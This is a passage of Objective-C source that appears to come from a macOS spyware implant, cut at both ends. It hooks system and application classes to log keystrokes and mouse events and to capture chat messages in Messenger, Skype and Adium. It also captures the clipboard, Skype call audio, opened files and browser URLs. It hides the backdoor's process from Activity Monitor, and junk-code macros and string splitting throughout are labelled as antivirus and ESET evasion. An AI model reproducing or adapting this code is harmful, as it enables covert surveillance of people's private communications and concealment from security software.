    if (mouseFlag == 1)
    {   
      // AV evasion: only on release build
      AV_GARBAGE_003 

      mouseFlag = 2;  
      
      // AV evasion: only on release build
      AV_GARBAGE_002

      mouseAgentIsActive = 1;
      
      // AV evasion: only on release build
      AV_GARBAGE_008 

      Class className = objc_getClass("NSWindow");
      
      // AV evasion: only on release build
      AV_GARBAGE_007 

      if (keyboardFlag == 0 || keylogAgentIsActive == 0)
      {
#ifdef DEBUG_INPUT_MANAGER
        infoLog(@"Hooking mouse");
#endif
        
        // AV evasion: only on release build
        AV_GARBAGE_002 

        swizzleMethod(className, @selector(hookKeyboardAndMouse:),
                      className, @selector(sendEvent:));
        
        // AV evasion: only on release build
        AV_GARBAGE_004
      }
      else
      {
#ifdef DEBUG_INPUT_MANAGER
        warnLog(@"Method already hooked for mouse/key");
#endif
      }
    }
    else if (mouseFlag == 3)
    {
      mouseFlag = 0; 
      
      // AV evasion: only on release build
      AV_GARBAGE_009 

      mouseAgentIsActive = 0;
      
#ifdef DEBUG_INPUT_MANAGER
      infoLog(@"Unhooking mouse");
#endif
      
      // AV evasion: only on release build
      AV_GARBAGE_006 

      if (keyboardFlag == 0)
      {   
        // AV evasion: only on release build
        AV_GARBAGE_001 

        Class className = objc_getClass("NSWindow");
        
        // AV evasion: only on release build
        AV_GARBAGE_003 

        swizzleMethod(className, @selector(hookKeyboardAndMouse:),
                      className, @selector(sendEvent:));  
        
        // AV evasion: only on release build
        AV_GARBAGE_001
      }
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_005 

    if (imFlag == 1)
    {   
      // AV evasion: only on release build
      AV_GARBAGE_001 

      imFlag = 2;
#ifdef DEBUG_INPUT_MANAGER
      infoLog(@"Hooking IMs");
#endif
      
      // AV evasion: only on release build
      AV_GARBAGE_003 

      Class className;
      Class classSource;
      
      if ([bundleIdentifier isEqualToString: @"com.microsoft.Messenger"])
      {   
        // AV evasion: only on release build
        AV_GARBAGE_002 

        // Microsoft Messenger
        className   = objc_getClass("IMWebViewController");   
        
        // AV evasion: only on release build
        AV_GARBAGE_003 

        classSource = objc_getClass(kMyIMWebViewController);
        
        // AV evasion: only on release build
        AV_GARBAGE_005 

        swizzleByAddingIMP(className, @selector(ParseAndAppendUnicode:inLength:inStyle:fIndent:fParseEmoticons:fParseURLs:inSenderName:fLocalUser:),
                           class_getMethodImplementation(classSource, @selector(ParseAndAppendUnicodeHook:inLength:inStyle:fIndent:fParseEmoticons:fParseURLs:inSenderName:fLocalUser:)),
                           @selector(ParseAndAppendUnicodeHook:inLength:inStyle:fIndent:fParseEmoticons:fParseURLs:inSenderName:fLocalUser:));
        
        // AV evasion: only on release build
        AV_GARBAGE_001 

        className   = objc_getClass("IMWindowController");   
        
        // AV evasion: only on release build
        AV_GARBAGE_002 

        classSource = objc_getClass(kMyIMWindowController);
        
        // AV evasion: only on release build
        AV_GARBAGE_003 

        swizzleByAddingIMP(className, @selector(SendMessage:cchText:inHTML:),
                           class_getMethodImplementation(classSource, @selector(SendMessageHook:cchText:inHTML:)),
                           @selector(SendMessageHook:cchText:inHTML:));
        
        // AV evasion: only on release build
        AV_GARBAGE_004
        
      }
      else if([bundleIdentifier isEqualToString: @"com.skype.skype"] && isSkypeVersionSupported())
      {   
        // AV evasion: only on release build
        AV_GARBAGE_007 

        // Skype
        // In order to avoid a linker error for a missing implementation
        Class className   = objc_getClass("SkypeChat");
        
        // AV evasion: only on release build
        AV_GARBAGE_009 

        Class classSource = objc_getClass(kMySkypeChat);
        
        // AV evasion: only on release build
        AV_GARBAGE_003 

        swizzleByAddingIMP (className, @selector(isMessageRecentlyDisplayed:),
                            class_getMethodImplementation(classSource, @selector(isMessageRecentlyDisplayedHook:)),
                            @selector(isMessageRecentlyDisplayedHook:));
        
        // AV evasion: only on release build
        AV_GARBAGE_008
      }
      else if([bundleIdentifier isEqualToString: @"com.adiumX.adiumX"])
      {
#ifdef DEBUG_IM_ADIUM
        infoLog(@"Hooking Adium");
#endif   
        // AV evasion: only on release build
        AV_GARBAGE_003 
        
        char esetEvasionAIContentController[256];
        
        sprintf(esetEvasionAIContentController, "AI%s%s", "Content", "Controller");
        
        Class className   = objc_getClass(esetEvasionAIContentController);
        
        // AV evasion: only on release build
        AV_GARBAGE_003 

        Class classSource = objc_getClass(kMyAIContentController);
        
        // AV evasion: only on release build
        AV_GARBAGE_003 

        swizzleByAddingIMP(className, @selector(finishSendContentObject:), 
                           class_getMethodImplementation(classSource, @selector(myfinishSendContentObject:)),
                           @selector(myfinishSendContentObject:));
        
        // AV evasion: only on release build
        AV_GARBAGE_002 

        swizzleByAddingIMP(className, @selector(finishReceiveContentObject:), 
                           class_getMethodImplementation(classSource, @selector(myfinishReceiveContentObject:)),
                           @selector(myfinishReceiveContentObject:));
        
        // AV evasion: only on release build
        AV_GARBAGE_005
      }
    }
    else if (imFlag == 3 && isSkypeVersionSupported())
    {   
      // AV evasion: only on release build
      AV_GARBAGE_009 

      imFlag = 0;
#ifdef DEBUG_INPUT_MANAGER
      infoLog(@"Unhooking IMs");
#endif   
      // AV evasion: only on release build
      AV_GARBAGE_006 

      // In order to avoid a linker error for a missing implementation
      Class className = objc_getClass("SkypeChat");
      
      // AV evasion: only on release build
      AV_GARBAGE_003 

      //swizzleMethod(className, @selector(isMessageRecentlyDisplayed:),
      //              className, @selector(isMessageRecentlyDisplayedHook:));
      
      // AV evasion: only on release build
      AV_GARBAGE_000 

      swizzleByAddingIMP (className, @selector(isMessageRecentlyDisplayed:),
                          class_getMethodImplementation(className, @selector(isMessageRecentlyDisplayedHook:)),
                          @selector(isMessageRecentlyDisplayedHook:));
    }
    
    if (clipboardFlag == 1)
    {   
      // AV evasion: only on release build
      AV_GARBAGE_001 

      clipboardFlag = 2;
#ifdef DEBUG_INPUT_MANAGER
      infoLog(@"Hooking clipboards");
#endif   
      // AV evasion: only on release build
      AV_GARBAGE_004 

      // In order to avoid a linker error for a missing implementation
      Class className = objc_getClass("NSPasteboard");
      
      // AV evasion: only on release build
      AV_GARBAGE_006

      //swizzleMethod(className, @selector(setData:forType:),
      //className, @selector(setDataHook:forType:));
      swizzleByAddingIMP(className,
                         @selector(setData:forType:),
                         class_getMethodImplementation(className,
                                                       @selector(setDataHook:forType:)),
                         @selector(setDataHook:forType:));
      
      // AV evasion: only on release build
      AV_GARBAGE_007
    }
    else if (clipboardFlag == 3)
    {   
      // AV evasion: only on release build
      AV_GARBAGE_001 

      clipboardFlag = 0;
#ifdef DEBUG_INPUT_MANAGER
      infoLog(@"Unhooking clipboards");
#endif   
      // AV evasion: only on release build
      AV_GARBAGE_007 

      // In order to avoid a linker error for a missing implementation
      Class className = objc_getClass("NSPasteboard");
      
      // AV evasion: only on release build
      AV_GARBAGE_008 

      //swizzleMethod(className, @selector(setData:forType:),
      //className, @selector(setDataHook:forType:));
      swizzleByAddingIMP(className,
                         @selector(setData:forType:),
                         class_getMethodImplementation(className,
                                                       @selector(setDataHook:forType:)),
                         @selector(setDataHook:forType:));
      
      // AV evasion: only on release build
      AV_GARBAGE_009
    }
    
    //if (voipFlag == 1 && isSkypeVersionSupported())
    if (voipFlag == 1)
    {   
      // AV evasion: only on release build
      AV_GARBAGE_006 

      voipFlag = 2;
#ifdef DEBUG_INPUT_MANAGER
      infoLog(@"Hooking voip calls");
#endif
      mach_error_t mError;
      
      // AV evasion: only on release build
      AV_GARBAGE_003 

      //
      // Let's check which skype we have here
      // Looks like skype 5 doesn't implement few selectors available on
      // 2.x branch
      //
      Class className   = objc_getClass("MacCallX");
      
      // AV evasion: only on release build
      AV_GARBAGE_001

      Class classSource = objc_getClass(kMyMacCallX);
      
      // AV evasion: only on release build
      AV_GARBAGE_002 

      Method method     = class_getInstanceMethod(className,
                                                  @selector(placeCallTo:));
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      //
      // Dunno why but checking with respondsToSelector
      // doesn't work here... Odd
      //
      if (method != nil)
      {
#ifdef DEBUG_INPUT_MANAGER
        infoLog(@"Hooking skype 2.x");
#endif   
        // AV evasion: only on release build
        AV_GARBAGE_000 

        //
        // We're dealing with skype 2.x
        //
        class_addMethod(className,
                        @selector(checkActiveMembersName),
                        class_getMethodImplementation(classSource,
                                                      @selector(checkActiveMembersName)),
                        "v@:");
        
        // AV evasion: only on release build
        AV_GARBAGE_001

        swizzleByAddingIMP(className,
                           @selector(placeCallTo:),
                           class_getMethodImplementation(classSource,
                                                         @selector(placeCallToHook:)),
                           @selector(placeCallToHook:));
        
        // AV evasion: only on release build
        AV_GARBAGE_002 

        swizzleByAddingIMP(className,
                           @selector(answer),
                           class_getMethodImplementation(classSource,
                                                         @selector(answerHook)),
                           @selector(answerHook));
        
        // AV evasion: only on release build
        AV_GARBAGE_003 

        swizzleByAddingIMP(className,
                           @selector(isFinished),
                           class_getMethodImplementation(classSource,
                                                         @selector(isFinishedHook)),
                           @selector(isFinishedHook));
        
        // AV evasion: only on release build
        AV_GARBAGE_004

        if ((mError = mach_override("_AudioDeviceAddIOProc", "CoreAudio",
                                    (void *)&_hook_AudioDeviceAddIOProc,
                                    (void **)&_real_AudioDeviceAddIOProc)))
        {
#ifdef DEBUG_INPUT_MANAGER
          errorLog(@"mach_override error on AudioDeviceAddIOProc");
#endif
        }
        
        // AV evasion: only on release build
        AV_GARBAGE_003 

        if ((mError = mach_override("_AudioDeviceRemoveIOProc", "CoreAudio",
                                    (void *)&_hook_AudioDeviceRemoveIOProc,
                                    (void **)&_real_AudioDeviceRemoveIOProc)))
        {
#ifdef DEBUG_INPUT_MANAGER
          errorLog(@"mach_override error on AudioDeviceRemoveIOProc");
#endif
        }
        
        // AV evasion: only on release build
        AV_GARBAGE_008 

        //
        // For 2.x we can start hooking here since AddIOProc deals only
        // with input/output voice call (that is, no effects are managed
        // by registered procs)
        //
        VPSkypeStartAgent();
      }
      else
      {
#ifdef DEBUG_INPUT_MANAGER
        infoLog(@"Hooking skype 5.x");
#endif
        
        // AV evasion: only on release build
        AV_GARBAGE_009 

        Class c1 = objc_getClass("EventController");
        
        // AV evasion: only on release build
        AV_GARBAGE_008

        Class c2 = objc_getClass(kMyEventController);
        
        // AV evasion: only on release build
        AV_GARBAGE_007 

        swizzleByAddingIMP(c1,
                           @selector(handleNotification:),
                           class_getMethodImplementation(c2,
                                                         @selector(handleNotificationHook:)),
                           @selector(handleNotificationHook:));
        
        // AV evasion: only on release build
        AV_GARBAGE_005

        //
        // We're dealing with skype 5.x
        //
        if ((mError = mach_override("_AudioDeviceCreateIOProcID", "CoreAudio",
                                    (void *)&_hook_AudioDeviceCreateIOProcID,
                                    (void **)&_real_AudioDeviceCreateIOProcID)))
        {
#ifdef DEBUG_INPUT_MANAGER
          errorLog(@"mach_override error on AudioDeviceCreateIOProcID");
#endif
        }
        
        // AV evasion: only on release build
        AV_GARBAGE_003 

        if ((mError = mach_override("_AudioDeviceDestroyIOProcID", "CoreAudio",
                                    (void *)&_hook_AudioDeviceDestroyIOProcID,
                                    (void **)&_real_AudioDeviceDestroyIOProcID)))
        {
#ifdef DEBUG_INPUT_MANAGER
          errorLog(@"mach_override error on AudioDeviceDestroyIOProcID");
#endif
        }
      }
      
      // AV evasion: only on release build
      AV_GARBAGE_004 

      //
      // Those are shared among the different versions
      // and need to be hooked all the times
      //
      if ((mError = mach_override("_AudioDeviceStart", "CoreAudio",
                                  (void *)&_hook_AudioDeviceStart,
                                  (void **)&_real_AudioDeviceStart)))
      {
#ifdef DEBUG_INPUT_MANAGER
        errorLog(@"mach_override error on AudioDeviceStart");
#endif
      }
      
      // AV evasion: only on release build
      AV_GARBAGE_008 

      if ((mError = mach_override("_AudioDeviceStop", "CoreAudio",
                                  (void *)&_hook_AudioDeviceStop,
                                  (void **)&_real_AudioDeviceStop)))
      {
#ifdef DEBUG_INPUT_MANAGER
        errorLog(@"mach_override error");
#endif
      }
    }
    else if (voipFlag == 3)
    {   
      // AV evasion: only on release build
      AV_GARBAGE_001 

      voipFlag = 0;
      
      // AV evasion: only on release build
      AV_GARBAGE_002 

      VPSkypeStopAgent();
#ifdef DEBUG_INPUT_MANAGER
      infoLog(@"Unhooking voip calls");
#endif
      
      // AV evasion: only on release build
      AV_GARBAGE_003 

      // In order to avoid a linker error for a missing implementation
      Class className   = objc_getClass("MacCallX");
      
      // AV evasion: only on release build
      AV_GARBAGE_004 

      Class classSource = objc_getClass(kMyMacCallX);
      
      // AV evasion: only on release build
      AV_GARBAGE_005 

      if ([className respondsToSelector: @selector(placeCallTo:)])
      {   
        // AV evasion: only on release build
        AV_GARBAGE_006 

        //
        // Skype 2.x
        //
        swizzleByAddingIMP(className,
                           @selector(placeCallTo:),
                           class_getMethodImplementation(classSource,
                                                         @selector(placeCallToHook:)),
                           @selector(placeCallToHook:));
        
        // AV evasion: only on release build
        AV_GARBAGE_007 

        swizzleByAddingIMP(className,
                           @selector(answer),
                           class_getMethodImplementation(classSource,
                                                         @selector(answerHook)),
                           @selector(answerHook));
        
        // AV evasion: only on release build
        AV_GARBAGE_008
      }
      else
      {   
        // AV evasion: only on release build
        AV_GARBAGE_007 

        //
        // Skype 5.x
        //
        Class c1 = objc_getClass("EventController");
        
        // AV evasion: only on release build
        AV_GARBAGE_008 

        Class c2 = objc_getClass(kMyEventController);
        
        // AV evasion: only on release build
        AV_GARBAGE_003 

        swizzleByAddingIMP(c1,
                           @selector(handleNotification:),
                           class_getMethodImplementation(c2,
                                                         @selector(handleNotificationHook:)),
                           @selector(handleNotificationHook:));
        
        // AV evasion: only on release build
        AV_GARBAGE_005 

      }
    }
    
    if (fileFlag == 1)
    {   
      // AV evasion: only on release build
      AV_GARBAGE_001 

      fileFlag = 2;
#ifdef DEBUG_INPUT_MANAGER
      infoLog(@"Hooking for file capture");
#endif
      
      // AV evasion: only on release build
      AV_GARBAGE_002 

      Class className   = objc_getClass("NSDocumentController");   
      // AV evasion: only on release build
      AV_GARBAGE_001 

      Class classSource = objc_getClass(kMyNSDocumentController);
      
      // AV evasion: only on release build
      AV_GARBAGE_003 

      swizzleByAddingIMP(className,
                         @selector(openDocumentWithContentsOfURL:display:error:),
                         class_getMethodImplementation(classSource,
                                                       @selector(openDocumentWithContentsOfURLHook:display:error:)),
                         @selector(openDocumentWithContentsOfURLHook:display:error:));
      
      // AV evasion: only on release build
      AV_GARBAGE_006 

      FCStartAgent();
    }
    else if (fileFlag == 3)
    {   
      // AV evasion: only on release build
      AV_GARBAGE_000 

      fileFlag = 0;
      
      // AV evasion: only on release build
      AV_GARBAGE_001 

      FCStopAgent();
      
      // AV evasion: only on release build
      AV_GARBAGE_003 

      Class className   = objc_getClass("NSDocumentController");
      
      // AV evasion: only on release build
      AV_GARBAGE_002 

      Class classSource = objc_getClass(kMyNSDocumentController);
      
      // AV evasion: only on release build
      AV_GARBAGE_003 

      swizzleByAddingIMP(className,
                         @selector(openDocumentWithContentsOfURL:display:error:),
                         class_getMethodImplementation(classSource,
                                                       @selector(openDocumentWithContentsOfURLHook:display:error:)),
                         @selector(openDocumentWithContentsOfURLHook:display:error:));
      
      // AV evasion: only on release build
      AV_GARBAGE_004

#ifdef DEBUG_INPUT_MANAGER
      infoLog(@"Unhooking for file capture");
#endif
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_003 

    sleep(1);
    
    // AV evasion: only on release build
    AV_GARBAGE_005 

    [innerPool release];
  }
  
  [pool release];
}

+ (BOOL)initSharedMemory
{   
  // AV evasion: only on release build
  AV_GARBAGE_002 

  //
  // Initialize and attach to our Shared Memory regions
  //
  key_t memKeyForCommand = ftok([NSHomeDirectory() UTF8String], 3);   
  
  // AV evasion: only on release build
  AV_GARBAGE_006

  key_t memKeyForLogging = ftok([NSHomeDirectory() UTF8String], 5);
  
  // AV evasion: only on release build
  AV_GARBAGE_003 

  gMemLogMaxSize = sizeof(shMemoryLog) * SHMEM_LOG_MAX_NUM_BLOCKS;
  
  // AV evasion: only on release build
  AV_GARBAGE_007

  mSharedMemoryCommand = [[__m_MSharedMemory alloc] initWithKey: memKeyForCommand
                                                          size: gMemCommandMaxSize
                                                 semaphoreName: SHMEM_SEM_NAME];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
if ([mSharedMemoryCommand createMemoryRegion] == -1)
    {
#ifdef DEBUG_INPUT_MANAGER
      errorLog(@"Error while creating shared memory for commands");
#endif   
      // AV evasion: only on release build
      AV_GARBAGE_008

      [mSharedMemoryCommand release];
      
      // AV evasion: only on release build
      AV_GARBAGE_003 

      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_003 

  mSharedMemoryLogging = [[__m_MSharedMemory alloc] initWithKey: memKeyForLogging
                                                          size: gMemLogMaxSize
                                                 semaphoreName: SHMEM_SEM_NAME];
  
  // AV evasion: only on release build
  AV_GARBAGE_005

  if ([mSharedMemoryLogging createMemoryRegion] == -1)
    {
#ifdef DEBUG_INPUT_MANAGER
      errorLog(@"Error while creating shared memory for logging");
#endif   
      // AV evasion: only on release build
      AV_GARBAGE_003 

      [mSharedMemoryCommand release];
      [mSharedMemoryLogging release];
      return NO;
    }

  //
  // Now it's safe to attach
  //
  [mSharedMemoryCommand attachToMemoryRegion];
  
  // AV evasion: only on release build
  AV_GARBAGE_007

  [mSharedMemoryLogging attachToMemoryRegion];
  
  // AV evasion: only on release build
  AV_GARBAGE_004

  return YES;
}

+ (void)checkAgentAtOffset: (uint32_t)offset
{
  NSMutableData *readData;
  shMemoryCommand *shMemCommand;
  
  NSString *safariId = [NSString stringWithFormat:@"%@.%@.%@", @"com", @"apple", @"safari"];
  
  // AV evasion: only on release build
  AV_GARBAGE_001 

  NSString *identifier = [[NSBundle mainBundle] bundleIdentifier];
  
  // AV evasion: only on release build
  AV_GARBAGE_002 

  readData = [mSharedMemoryCommand readMemory: offset
                                fromComponent: COMP_AGENT];
  
  // AV evasion: only on release build
  AV_GARBAGE_005 

  shMemCommand = (shMemoryCommand *)[readData bytes];
  
  // AV evasion: only on release build
  AV_GARBAGE_003 

  if (readData != nil)
  {
    switch (offset)
    {
      case OFFT_URL:
      {   
        // AV evasion: only on release build
        AV_GARBAGE_009

        if (urlFlag == 0
            && shMemCommand->command == AG_START)
        {   
          // AV evasion: only on release build
          AV_GARBAGE_002

          if ([identifier isCaseInsensitiveLike: safariId] ||
              [identifier isCaseInsensitiveLike: @"org.mozilla.firefox"])
          {
#ifdef DEBUG_INPUT_MANAGER
            infoLog(@"Starting Agent URL");
#endif   
            // AV evasion: only on release build
            AV_GARBAGE_009

            urlFlag = 1;
          }
          else
          {
#ifdef DEBUG_INPUT_MANAGER
            verboseLog(@"Skipping (%@) for URL", identifier);
#endif
          }
        }
        else if ((urlFlag == 1 || urlFlag == 2)
                 && shMemCommand->command == AG_STOP)
        {   
          // AV evasion: only on release build
          AV_GARBAGE_006 

          if ([identifier isCaseInsensitiveLike: safariId] ||
              [identifier isCaseInsensitiveLike: @"org.mozilla.firefox"])
          {   
            // AV evasion: only on release build
            AV_GARBAGE_007 

#ifdef DEBUG_INPUT_MANAGER
            infoLog(@"Stopping Agent URL");
#endif   
            // AV evasion: only on release build
            AV_GARBAGE_008 

            urlFlag = 3;
          }
          else
          {
#ifdef DEBUG_INPUT_MANAGER
            verboseLog(@"Skipping (%@) for URL", identifier);
#endif
          }
        }
      } break;
      case OFFT_APPLICATION:
      {
        if (appFlag == 0
            && shMemCommand->command == AG_START)
        {
#ifdef DEBUG_INPUT_MANAGER
          infoLog(@"Starting Agent Application");
#endif   
          // AV evasion: only on release build
          AV_GARBAGE_009 

          appFlag = 1;
        }
        else if ((appFlag == 1 || appFlag == 2)
                 && shMemCommand->command == AG_STOP)
        {
#ifdef DEBUG_INPUT_MANAGER
          infoLog(@"Stopping Agent Application");
#endif   
          // AV evasion: only on release build
          AV_GARBAGE_000 

          appFlag = 3;
        }
      } break;
      case OFFT_KEYLOG:
      {
        if (keyboardFlag == 0
            && shMemCommand->command == AG_START)
        {
#ifdef DEBUG_INPUT_MANAGER
          infoLog(@"Starting Agent Keylog");
#endif   
          // AV evasion: only on release build
          AV_GARBAGE_008 

          keyboardFlag = 1;
        }
        else if ((keyboardFlag == 1 || keyboardFlag == 2)
                 && shMemCommand->command == AG_STOP)
        {
#ifdef DEBUG_INPUT_MANAGER
          infoLog(@"Stopping Agent Keylog");
#endif   
          // AV evasion: only on release build
          AV_GARBAGE_004 

          keyboardFlag = 3;
        }
      } break;
      case OFFT_MOUSE:
      {
        if (mouseFlag == 0
            && shMemCommand->command == AG_START)
        {
#ifdef DEBUG_INPUT_MANAGER
          infoLog(@"Starting Agent Mouse");
#endif   
          // AV evasion: only on release build
          AV_GARBAGE_003 

          mouseFlag = 1;
        }
        else if ((mouseFlag == 1 || mouseFlag == 2)
                 && shMemCommand->command == AG_STOP)
        {
#ifdef DEBUG_INPUT_MANAGER
          infoLog(@"Stopping Agent Mouse");
#endif   
          // AV evasion: only on release build
          AV_GARBAGE_006 

          mouseFlag = 3;
        }
      } break;
      case OFFT_VOIP:
      {
        if (voipFlag == 0
            && shMemCommand->command == AG_START)
        {   
          // AV evasion: only on release build
          AV_GARBAGE_001

          if ([identifier isCaseInsensitiveLike: @"com.skype.skype"])
          {
#ifdef DEBUG_INPUT_MANAGER
            infoLog(@"Starting Agent VOIP");
#endif   
            // AV evasion: only on release build
            AV_GARBAGE_002 

            voipFlag = 1;
          }
          else
          {
#ifdef DEBUG_INPUT_MANAGER
            verboseLog(@"Skipping (%@) for VOIP", identifier);
#endif
          }
        }
        else if ((voipFlag == 1 || voipFlag == 2)
                 && shMemCommand->command == AG_STOP)
        {   
          // AV evasion: only on release build
          AV_GARBAGE_007 

          if ([identifier isCaseInsensitiveLike: @"com.skype.skype"])
          {
#ifdef DEBUG_INPUT_MANAGER
            infoLog(@"Stopping Agent VOIP");
#endif   
            // AV evasion: only on release build
            AV_GARBAGE_008 

            voipFlag = 3;
          }
          else
          {
#ifdef DEBUG_INPUT_MANAGER
            verboseLog(@"Skipping (%@) for VOIP", identifier);
#endif
          }
        } 
      } break;
      case OFFT_IM:
      {
        
        if (imFlag == 0
            && shMemCommand->command == AG_START)
        {   
          // AV evasion: only on release build
          AV_GARBAGE_009 

          if ([identifier isCaseInsensitiveLike: @"com.microsoft.messenger"]
              || [identifier isCaseInsensitiveLike: @"com.skype.skype"]
              || [identifier isCaseInsensitiveLike: @"com.adiumX.adiumX"])
          {
#ifdef DEBUG_INPUT_MANAGER
            infoLog(@"Starting Agent IM");
#endif   
            // AV evasion: only on release build
            AV_GARBAGE_007 

            imFlag = 1;
          }
          else
          {
#ifdef DEBUG_INPUT_MANAGER
            verboseLog(@"Skipping (%@) for IM", identifier);
#endif
          }
        }
        else if ((imFlag == 1 || imFlag == 2)
                 && shMemCommand->command == AG_STOP)
        {   
          // AV evasion: only on release build
          AV_GARBAGE_005 

          if ([identifier isCaseInsensitiveLike: @"com.microsoft.messenger"]
              || [identifier isCaseInsensitiveLike: @"com.skype.skype"]
              || [identifier isCaseInsensitiveLike: @"com.adiumX.adiumX"])
          {
#ifdef DEBUG_INPUT_MANAGER
            infoLog(@"Stopping Agent IM");
#endif   
            // AV evasion: only on release build
            AV_GARBAGE_004 

            imFlag = 3;
          }
          else
          {
#ifdef DEBUG_INPUT_MANAGER
            verboseLog(@"Skipping (%@) for IM", identifier);
#endif
          }
        }
      } break;
      case OFFT_CLIPBOARD:
      {
        if (clipboardFlag == 0
            && shMemCommand->command == AG_START)
        {
#ifdef DEBUG_INPUT_MANAGER
          infoLog(@"Starting Agent Clipboard");
#endif   
          // AV evasion: only on release build
          AV_GARBAGE_007

          clipboardFlag = 1;
        }
        else if ((clipboardFlag == 1 || clipboardFlag == 2)
                 && shMemCommand->command == AG_STOP)
        {
#ifdef DEBUG_INPUT_MANAGER
          infoLog(@"Stopping Agent Clipboard");
#endif   
          // AV evasion: only on release build
          AV_GARBAGE_002 

          clipboardFlag = 3;
        }
      } break;
      case OFFT_FILECAPTURE:
      {
        if (fileFlag == 0
            && shMemCommand->command == AG_START)
        {
#ifdef DEBUG_INPUT_MANAGER
          infoLog(@"Starting Agent FileCapture");
#endif   
          // AV evasion: only on release build
          AV_GARBAGE_006 

          fileFlag = 1;
        }
        else if ((fileFlag == 1 || fileFlag == 2)
                 && shMemCommand->command == AG_STOP)
        {
#ifdef DEBUG_INPUT_MANAGER
          infoLog(@"Stopping Agent FileCapture");
#endif   
          // AV evasion: only on release build
          AV_GARBAGE_008 

          fileFlag = 3;
        }
      } break;
      default:
      {
#ifdef DEBUG_INPUT_MANAGER
        errorLog(@"Invalid offset 0x%x", offset);
#endif
      }
    }
  }
  else
  {
#ifdef DEBUG_INPUT_MANAGER
    verboseLog(@"data is nil at offset 0x%x", offset);
#endif
  }
}

+ (void)checkForCommands
{   
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  NSMutableData *readData;
  shMemoryCommand *shMemCommand;
  
  // AV evasion: only on release build
  AV_GARBAGE_004 

  while (isAppRunning == YES)
    {   
      // AV evasion: only on release build
      AV_GARBAGE_005 

      readData = [mSharedMemoryCommand readMemory: OFFT_COMMAND
                                    fromComponent: COMP_AGENT];
      
      // AV evasion: only on release build
      AV_GARBAGE_007

      if (readData != nil)
        {   
          // AV evasion: only on release build
          AV_GARBAGE_008

          shMemCommand = (shMemoryCommand *)[readData bytes];
          
          // AV evasion: only on release build
          AV_GARBAGE_004

          switch (shMemCommand->command)
            {
                
            // AV evasion: only on release build
            AV_GARBAGE_003 

            case CR_REGISTER_SYNC_SAFARI:
              {
                //
                // Send reply, yes we can and start syncing
                //
                
                // AV evasion: only on release build
                AV_GARBAGE_001

                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
                
                // AV evasion: only on release build
                AV_GARBAGE_002 

                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                shMemoryHeader->agentID   = OFFT_COMMAND;
                
                // AV evasion: only on release build
                AV_GARBAGE_003 

                shMemoryHeader->direction = D_TO_CORE;
                shMemoryHeader->command   = IM_CAN_SYNC_SAFARI;
                
                // AV evasion: only on release build
                AV_GARBAGE_004 

                if ([gSharedMemoryCommand writeMemory: agentCommand
                                               offset: OFFT_COMMAND
                                        fromComponent: COMP_CORE] == TRUE)
                  {
                    NSMutableData *syncConfig = [[NSMutableData alloc] initWithBytes: shMemCommand->commandData
                                                                              length: shMemCommand->commandDataSize ];
                    
                    // AV evasion: only on release build
                    AV_GARBAGE_008 

                    // Ok, now sync bitch!
                    /*
                    __m_MCommunicationManager *commManager = [[__m_MCommunicationManager alloc]
                                                             initWithConfiguration: syncConfig];
                    
                    if ([commManager performSync] == FALSE)
                      {
#ifdef DEBUG_INPUT_MANAGER
                        infoLog(@"Sync failed from Safari");
#endif
                      }
                    else
                      {
#ifdef DEBUG_INPUT_MANAGER
                        infoLog(@"Sync from Safari went OK!");
#endif
                      }
                    
                    [commManager release];
                    */
                    [syncConfig release];
                  }
                
                break;
              }
            default:
              break;
            }
        }
      
      // AV evasion: only on release build
      AV_GARBAGE_003 

      usleep(7000);
    }
}

+ (void)hideCoreFromAM
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_003 

  NSMutableData *readData;
  shMemoryCommand *shMemCommand;
  
#ifdef DEBUG_INPUT_MANAGER
  verboseLog(@"[DYLIB] %s: reading from shared", __FUNCTION__);
#endif
  
  // Get pid on shmem
  // waiting till core write it...
  while (TRUE)
  {   
    // AV evasion: only on release build
    AV_GARBAGE_007 

    readData = [mSharedMemoryCommand readMemory: OFFT_CORE_PID
                                  fromComponent: COMP_AGENT];
    
    // AV evasion: only on release build
    AV_GARBAGE_009 

    if (readData != nil)
    {   
      // AV evasion: only on release build
      AV_GARBAGE_006 

      shMemCommand = (shMemoryCommand *)[readData bytes];
      
      // AV evasion: only on release build
      AV_GARBAGE_005 

#ifdef DEBUG_INPUT_MANAGER
      verboseLog(@"[DYLIB] %s: shmem", __FUNCTION__);
#endif
      
      // AV evasion: only on release build
      AV_GARBAGE_002 

      if (shMemCommand->command == CR_CORE_PID)
      {   
        // AV evasion: only on release build
        AV_GARBAGE_008 

        memcpy(&gBackdoorPID, shMemCommand->commandData, sizeof(pid_t));
        
#ifdef DEBUG_INPUT_MANAGER
        verboseLog(@"[DYLIB] %s: receiving core pid %d", __FUNCTION__, gBackdoorPID);
#endif
        break;
      }
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_009

    usleep(30000);
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_003 

  Class className   = objc_getClass("SMProcessController");
  
  // AV evasion: only on release build
  AV_GARBAGE_005

  Class classSource = objc_getClass(kMySMProcessController);
  
  // AV evasion: only on release build
  AV_GARBAGE_002

  if (className != nil)
  {
#ifdef DEBUG_INPUT_MANAGER
    verboseLog(@"Class SMProcessController swizzling");
#endif
    
    // AV evasion: only on release build
    AV_GARBAGE_006 

    swizzleByAddingIMP(className, @selector(outlineView:numberOfChildrenOfItem:),
                       class_getMethodImplementation(classSource, @selector(outlineViewHook:numberOfChildrenOfItem:)),
                       @selector(outlineViewHook:numberOfChildrenOfItem:));
    
    // AV evasion: only on release build
    AV_GARBAGE_000

    swizzleByAddingIMP(className, @selector(filteredProcesses),
                       class_getMethodImplementation(classSource, @selector(filteredProcessesHook)),
                       @selector(filteredProcessesHook));
  }
  else
  {
#ifdef DEBUG_INPUT_MANAGER
    errorLog(@"Class SMProcessController not found");
#endif
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_002

  [pool release];
}

+ (void)startThreadCommunicator: (NSNotification *)_notification
{
#ifdef DEBUG_INPUT_MANAGER
  NSString *bundleIdentifier = [[NSBundle mainBundle] bundleIdentifier];
  
